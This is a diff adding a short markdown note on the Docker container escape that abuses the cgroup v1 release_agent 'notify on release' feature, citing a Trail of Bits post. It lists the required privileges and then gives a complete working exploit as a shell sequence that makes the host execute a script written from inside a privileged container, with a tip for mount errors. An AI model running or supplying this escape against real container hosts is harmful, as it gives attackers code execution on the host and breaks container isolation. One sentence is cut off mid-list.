@@ -1,0 +1,33 @@
+cgroups release_agent feature 
+
+         An exploit that launches a process on the host from within a Docker container run with the --privileged flag. The PoC achieves this by abusing the Linux cgroup v1 “notification on release” feature.The 
+--privileged flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux
+
+
+   				Requirements to use this technique
+              * running as root inside the container
+              * container must be run with the SYS_ADMIN and allow the mount syscall
+              * The cgroup v1 virtual filesystem must be mounted read-write inside the container
+
+Docker starts containers with the docker-default AppArmor policy by default, which prevents the use of the mount syscall even when the container is run with SYS_ADMIN.
+A container would be vulnerable to this technique if run with the flags -> --security-opt apparmor=unconfined --cap-add=SYS_ADMIN
+
+```
+# On the host
+docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+ 
+# In the container
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x   // in case of “mount: /tmp/cgrp: special device cgroup does not exist” error : replace rdma with memory 
+ 
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+ 
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+ 
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so. 
